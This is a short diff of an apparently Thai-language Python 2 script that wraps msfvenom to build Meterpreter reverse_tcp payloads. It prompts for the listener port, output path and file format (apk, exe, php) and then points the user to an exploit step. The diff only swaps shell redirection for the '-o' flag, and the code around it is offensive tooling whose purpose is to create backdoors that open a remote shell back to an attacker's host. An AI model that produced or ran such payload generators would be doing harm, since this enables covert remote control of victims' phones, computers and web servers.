@@ -35,7 +35,7 @@ port = raw_input ("พอร์ท : ")
 out = raw_input ("ที่จัดเก็บ payload : ")
 outfile = raw_input ("ชนิดของไฟล์ : ")
 print "ตัวอย่างชนิดของไฟล์ apk,exe,php"
-os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s > %s" % (la, ip, port, outfile, out))
+os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f %s -o %s" % (la, ip, port, outfile, out))
 time.sleep(3)
 print " สร้าง payload เสร็จสิ้น กรุณารอ เพื่อไปหน้า exploit "
 time.sleep(3)
